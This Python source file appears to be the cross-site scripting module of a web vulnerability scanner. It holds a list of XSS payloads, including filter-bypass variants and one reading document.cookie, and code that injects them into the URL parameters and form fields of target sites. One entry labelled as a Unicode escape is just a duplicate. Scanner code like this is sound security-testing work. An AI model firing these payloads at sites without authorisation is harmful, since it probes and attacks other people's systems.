from __future__ import annotations
from bs4 import BeautifulSoup
from .base import BaseModule
from ..scanner import Finding, HIGH, mutate_query

class XSSModule(BaseModule):
    name = "Cross-Site Scripting"
    category = "Injection"

    def run(self):
        payloads = [
            # Reflected XSS
            'xploit"><svg/onload=alert(1)>',
            'xploit"><img src=x onerror=alert(1)>',
            'xploit\'><script>alert(1)</script>',
            'xploit"><details open ontoggle=alert(1)>',
            'xploit"><iframe src="javascript:alert(1)">',
            'xploit" onmouseover="alert(1)',
            'xploit"><a href="javascript:alert(1)">click</a>',
            'xploit"><video><source onerror=alert(1)>',
            'xploit"><body onload=alert(1)>',
            'xploit"><marquee onstart=alert(1)>',
            # DOM-based XSS patterns
            '<img src=x onerror=alert(document.domain)>',
            'javascript:alert(document.cookie)',
            '<svg onload=alert(1)>',
            # Filter bypass techniques
            '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',  # HTML entity encoding
            '<IMG SRC=x OnErRoR=alert(1)>',  # Case variation
            '<img src=x onerror=alert(1)>',  # Unicode escape
            '<img src=x onerror=alert(1)>',
            # Advanced XSS
            'xploit"><math><mtext><option><annotation encoding="text/html"><svg/onload=alert(1)></annotation></option></mtext></math>',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
        ]
        for payload in payloads:
            for url in list(self.scanner.pages):
                self._check_url(url, payload)
            
            for form in self.scanner.forms:
                self._check_form(form, payload)

    def _check_url(self, url, payload):
        from ..scanner import query_parameters
        for param in query_parameters(url):
            target_url = mutate_query(url, param, payload)
            res = self.scanner._request("GET", target_url)
            if res:
                self._analyze_reflection(res, param, payload, "GET")

    def _check_form(self, form, payload):
        for param in form.inputs:
            data = dict(form.inputs)
            data[param] = payload
            if form.method == "GET":
                res = self.scanner._request("GET", form.action, params=data)
            else:
                res = self.scanner._request("POST", form.action, data=data)
            if res:
                self._analyze_reflection(res, param, payload, form.method)

    def _analyze_reflection(self, response, parameter, payload, method):
        if "text/html" not in response.headers.get("Content-Type", "").lower():
            return

        if payload in response.text:
            # Check if payload is in a dangerous context
            # We look for the payload as part of the HTML
            # This is a broad check, can be refined
            if any(p in response.text for p in ["<svg", "<img", "<script", "onerror", "onload"]):
                self.add_finding(Finding(
                    id="XSS-001",
                    name="Reflected XSS",
                    category="Cross-Site Scripting",
                    severity=HIGH,
                    confidence="High",
                    url=response.url,
                    parameter=parameter,
                    method=method,
                    evidence=f"Payload {payload} reflected and parsed as DOM element.",
                    trigger=f"payload={payload}",
                    impact="Reflected HTML injection was observed in the response DOM. If a browser executes the injected context, attackers could run script in a victim's session.",
                    remediation="Apply context-aware output encoding.",
                    cwe="CWE-79"
                ))
